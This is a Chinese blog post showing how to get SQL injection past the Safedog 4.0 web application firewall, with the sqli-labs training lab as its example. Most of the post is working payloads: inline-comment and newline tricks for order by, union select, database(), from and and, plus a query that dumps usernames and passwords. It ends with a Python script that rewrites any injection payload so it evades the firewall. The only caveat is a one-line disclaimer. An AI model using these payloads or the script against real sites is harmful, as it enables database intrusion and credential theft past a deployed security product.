<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>sql注入绕过安全狗4.0 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="sql注入绕过安全狗4.0" />
<meta property="og:description" content="1.前言2.前置知识3.绕过关键字主要思路3.1绕过连体关键字思路3.2绕过单个关键字思路 4.以sqli-labs(Less-1)为例，绕过安全狗4.1拦截order by4.2拦截union select4.3拦截database()4.4拦截from4.5拦截and4.6查看数据库数据 5.面向安全狗4.0的py脚本6.sqli-labs无安全狗全通关payload 1.前言 该文章只进行技术分享与探讨，任何人进行非法操作与作者无关。
2.前置知识 /*!*/叫做内联注释，当!后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。
比如版本号为5.7.26，当/*!00000xxx*/-/*!50726xxx*/里的注释内容都可以解析为sql语句执行
而&gt;/*!50726xxx*/里的注释内容就真的被注释，失去作用。
3.绕过关键字主要思路 在关键字处使用内联注释和%23%0a（注释换行），内联注释里的版本号即使低于实际版本号有的可以绕过，有的不能绕过（可能是安全狗做了一点小过滤）
所以我们可以使用burpsuite的intruder模块检测一下哪些版本号可以绕过，这里以sqli-labs(Less-1)为例，把版本号设置为payload点
设置payload类型为numbers
然后开始重放
看到两种响应长度，就可以暂停了，有一种一定是能绕过安全狗的版本号
然后下面进行绕过的时候就使用那个能绕过的版本号
3.1绕过连体关键字思路 X代表关键字
X/*/A*/%23%0aX X/*/A*/X X/*/--A----/*/X X/*!66666A*/%23%0aX X/*!44444X*/ X/*!44444%23%0aX*/ /*!44444X/*!44444X*/ 3.2绕过单个关键字思路 X代表关键字
/*!%23%0aX*/ /*!X%23%0a*/ /*!44444X*/ X与前面参数连在一起（不用空格隔开，这个也是绕过方法） 4.以sqli-labs(Less-1)为例，绕过安全狗 4.1拦截order by 1&#39; order/*!%23%0aby*/ 3 %23 1&#39; order/*!*/%23%0aby 3 %23 1&#39; order/*/*/by 3%23 1&#39; order/*//------/*/by 3%23 1&#39; order/*//------/*/%23%0aby 3%23 4.2拦截union select -1&#39; union/*!44444%23%0aselect*/ 1,2,3 %23 -1&#39; union/*!44444%23%0aselect 1,2,3*/ %23 -1&#39; union/*/A/*/select 1,2,3 %23 -1&#39; union/*!66666A*/select 1,2,3 %23 4." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/306ddd1440ad49f7b5d000a956f9f108/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-07T21:57:21+08:00" />
<meta property="article:modified_time" content="2022-02-07T21:57:21+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">sql注入绕过安全狗4.0</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4> </h4> 
 <ul><li><a href="#1_4" rel="nofollow">1.前言</a></li><li><a href="#2_7" rel="nofollow">2.前置知识</a></li><li><a href="#3_13" rel="nofollow">3.绕过关键字主要思路</a></li><li><ul><li><a href="#31_29" rel="nofollow">3.1绕过连体关键字思路</a></li><li><a href="#32_42" rel="nofollow">3.2绕过单个关键字思路</a></li></ul> 
  </li><li><a href="#4sqlilabsLess1_51" rel="nofollow">4.以sqli-labs(Less-1)为例，绕过安全狗</a></li><li><ul><li><a href="#41order_by_53" rel="nofollow">4.1拦截order by</a></li><li><a href="#42union_select_63" rel="nofollow">4.2拦截union select</a></li><li><a href="#43database_72" rel="nofollow">4.3拦截database()</a></li><li><a href="#44from_81" rel="nofollow">4.4拦截from</a></li><li><a href="#45and_89" rel="nofollow">4.5拦截and</a></li><li><a href="#46_96" rel="nofollow">4.6查看数据库数据</a></li></ul> 
  </li><li><a href="#540py_110" rel="nofollow">5.面向安全狗4.0的py脚本</a></li><li><a href="#6sqlilabspayload_149" rel="nofollow">6.sqli-labs无安全狗全通关payload</a></li></ul> 
</div> 
<p></p> 
<hr> 
<h2><a id="1_4"></a>1.前言</h2> 
<p>该文章只进行技术分享与探讨，任何人进行非法操作与作者无关。</p> 
<h2><a id="2_7"></a>2.前置知识</h2> 
<p><code>/*!*/</code>叫做内联注释，当<code>!</code>后面所接的数据库版本号时，当实际的版本<strong>等于或是高于</strong>那个字符串，应用程序就会将<strong>注释内容解释为SQL</strong>，否则就会当做注释来处理。<strong>默认的，当没有接版本号时，是会执行里面的内容的</strong>。</p> 
<p>比如版本号为<code>5.7.26</code>，当<code>/*!00000xxx*/</code>-<code>/*!50726xxx*/</code>里的注释内容都可以解析为sql语句执行<br> 而&gt;<code>/*!50726xxx*/</code>里的注释内容就真的被注释，失去作用。</p> 
<h2><a id="3_13"></a>3.绕过关键字主要思路</h2> 
<p>在关键字处使用内联注释和%23%0a（注释换行），<strong>内联注释里的版本号即使低于实际版本号有的可以绕过，有的不能绕过（可能是安全狗做了一点小过滤）</strong><br> 所以我们可以使用burpsuite的intruder模块<strong>检测一下哪些版本号可以绕过</strong>，这里以sqli-labs(Less-1)为例，把版本号设置为payload点<br> <img src="https://images2.imgbox.com/dc/86/LUoAzfPa_o.png" alt="在这里插入图片描述"><br> 设置payload类型为numbers<br> <img src="https://images2.imgbox.com/3c/ea/ICIkjjME_o.png" alt="在这里插入图片描述"><br> 然后开始重放<br> <img src="https://images2.imgbox.com/d1/cf/A9W6dDg7_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/e0/73/rmAwAyyt_o.png" alt="在这里插入图片描述"><br> 看到两种响应长度，就可以暂停了，有一种一定是能绕过安全狗的版本号<br> <img src="https://images2.imgbox.com/2e/da/neMPDjco_o.png" alt="在这里插入图片描述"><br> <strong>然后下面进行绕过的时候就使用那个能绕过的版本号</strong></p> 
<h3><a id="31_29"></a>3.1绕过连体关键字思路</h3> 
<p>X代表关键字</p> 
<pre><code class="prism language-python">X<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>A<span class="token operator">*</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aX
X<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>A<span class="token operator">*</span><span class="token operator">/</span>X
X<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">-</span>A<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>X
X<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aX
X<span class="token operator">/</span><span class="token operator">*</span>!44444X<span class="token operator">*</span><span class="token operator">/</span>
X<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">44444</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aX<span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!44444X<span class="token operator">/</span><span class="token operator">*</span>!44444X<span class="token operator">*</span><span class="token operator">/</span>
</code></pre> 
<h3><a id="32_42"></a>3.2绕过单个关键字思路</h3> 
<p>X代表关键字</p> 
<pre><code class="prism language-python"><span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aX<span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!X<span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">0a</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!44444X<span class="token operator">*</span><span class="token operator">/</span>
X与前面参数连在一起（不用空格隔开，这个也是绕过方法）
</code></pre> 
<h2><a id="4sqlilabsLess1_51"></a>4.以sqli-labs(Less-1)为例，绕过安全狗</h2> 
<h3><a id="41order_by_53"></a>4.1拦截order by</h3> 
<pre><code class="prism language-python"><span class="token number">1</span>' order<span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aby<span class="token operator">*</span><span class="token operator">/</span> <span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span>
<span class="token number">1</span>' order<span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">*</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aby <span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span>
<span class="token number">1</span>' order<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>by <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token number">1</span>' order<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">//</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>by <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token number">1</span>' order<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">//</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aby <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h3><a id="42union_select_63"></a>4.2拦截union select</h3> 
<pre><code class="prism language-python"><span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">44444</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aselect<span class="token operator">*</span><span class="token operator">/</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">44444</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0aselect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">*</span><span class="token operator">/</span> <span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>A<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h3><a id="43database_72"></a>4.3拦截database()</h3> 
<pre><code class="prism language-python"><span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span>!database<span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">0a</span><span class="token operator">*</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>database<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">44444</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>database<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>A<span class="token operator">*</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
也适用于拦截user<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h3><a id="44from_81"></a>4.4拦截from</h3> 
<pre><code class="prism language-python"><span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span>0afrom<span class="token operator">*</span><span class="token operator">/</span> information_schema<span class="token punctuation">.</span>schemata<span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">*</span>!44444from<span class="token operator">*</span><span class="token operator">/</span> information_schema<span class="token punctuation">.</span>schemata<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h3><a id="45and_89"></a>4.5拦截and</h3> 
<pre><code class="prism language-python"><span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">*</span>!<span class="token keyword">from</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">0a</span><span class="token operator">*</span><span class="token operator">/</span>information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token string">"users"</span> <span class="token operator">/</span><span class="token operator">*</span>!44444and<span class="token operator">*</span><span class="token operator">/</span>table_schema<span class="token operator">=</span><span class="token string">"security"</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">*</span>!<span class="token keyword">from</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">0a</span><span class="token operator">*</span><span class="token operator">/</span>information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token string">"users"</span><span class="token operator">/</span><span class="token operator">*</span>!44444and<span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">0a</span><span class="token operator">*</span><span class="token operator">/</span>table_schema<span class="token operator">=</span><span class="token string">"security"</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h3><a id="46_96"></a>4.6查看数据库数据</h3> 
<pre><code class="prism language-python">查看所有数据库
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token operator">%</span><span class="token number">23</span>
查看security库下的所有表
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token string">"security"</span> <span class="token operator">%</span><span class="token number">23</span>
查看users表的字段
<span class="token operator">-</span><span class="token number">1</span>' union<span class="token operator">/</span><span class="token operator">*</span>!<span class="token number">66666A</span><span class="token operator">*</span><span class="token operator">/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">*</span>!<span class="token keyword">from</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">0a</span><span class="token operator">*</span><span class="token operator">/</span>information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token string">"users"</span> <span class="token operator">/</span><span class="token operator">*</span>!44444and<span class="token operator">*</span><span class="token operator">/</span>table_schema<span class="token operator">=</span><span class="token string">"security"</span><span class="token operator">%</span><span class="token number">23</span>
查看users表的记录
<span class="token operator">-</span><span class="token number">1</span><span class="token string">' union/*!66666A*/select 1,2,group_concat(concat(username,'</span><span class="token punctuation">:</span>'<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h2><a id="540py_110"></a>5.面向安全狗4.0的py脚本</h2> 
<pre><code class="prism language-python"><span class="token keyword">import</span> re
<span class="token comment"># 如果被拦截在这更换绕过方法</span>
<span class="token keyword">def</span> <span class="token function">allBypass</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    过滤了order by,union select,database,user,version,from,and,or,updatexml,extractvalue,=,空格
    \b为了精准匹配整个单词，而不是匹配某个单词的一部分
    比如我要匹配and这个逻辑符，有一个单词rand，不加\b就会匹配上rand中的一部分，从而导致替换错误，加了\b就不会匹配
    re.I 忽略大小写，如果不能绕过可能是version出问题，上面标题3有解决办法
    """</span>
    version <span class="token operator">=</span> <span class="token string">'44444'</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\border by\b'</span><span class="token punctuation">,</span><span class="token string">'order/*!%23%0aby*/'</span><span class="token punctuation">,</span>sql<span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\bunion select\b'</span><span class="token punctuation">,</span><span class="token string">'union/*!'</span><span class="token operator">+</span>version<span class="token operator">+</span><span class="token string">'%23%0aselect*/'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\bdatabase[()]{2}'</span><span class="token punctuation">,</span><span class="token string">'/*!database%23%0a*/()'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\buser[()]{2}'</span><span class="token punctuation">,</span><span class="token string">'/*!user%23%0a*/()'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\bversion[()]{2}'</span><span class="token punctuation">,</span><span class="token string">'/*!'</span><span class="token operator">+</span>version<span class="token operator">+</span><span class="token string">'version*/()'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\bfrom\b'</span><span class="token punctuation">,</span><span class="token string">'/*!%23%0afrom*/'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\band\b'</span><span class="token punctuation">,</span><span class="token string">'/*!'</span><span class="token operator">+</span>version<span class="token operator">+</span><span class="token string">'and%23%0a*/'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\bor\b'</span><span class="token punctuation">,</span><span class="token string">'/*!'</span><span class="token operator">+</span>version<span class="token operator">+</span><span class="token string">'or%23%0a*/'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\bupdatexml\b'</span><span class="token punctuation">,</span><span class="token string">'/*!updatexml%23%0a*/'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\bextractvalue\b'</span><span class="token punctuation">,</span><span class="token string">'/*!extractvalue%23%0a*/'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'='</span><span class="token punctuation">,</span><span class="token string">'%0alike%0a'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token comment"># 将空格替换为%0a</span>
    <span class="token comment"># str = re.sub(r' ','%0a',str,flags=re.I)</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span>

<span class="token comment"># 把payload放到下面</span>
sql <span class="token operator">=</span> <span class="token triple-quoted-string string">"""

1' and gtid_subset(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),1) %23

"""</span>
<span class="token comment"># 将sql变量值改装</span>
sql <span class="token operator">=</span> sql<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
sql <span class="token operator">=</span> allBypass<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="6sqlilabspayload_149"></a>6.sqli-labs无安全狗全通关payload</h2> 
<p><a href="https://blog.csdn.net/weixin_43623271/article/details/122801320">https://blog.csdn.net/weixin_43623271/article/details/122801320</a><br> 可以把上面网站的payload拿去跑一遍脚本，然后提交过狗。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/141edcb7c54dce623451ee525564fd54/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">LeetCode 56. 合并区间【c&#43;&#43;/java详细题解】</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8f0738a940d46c2465043fedceddd7ea/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">K8S 安装 Dashboard</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>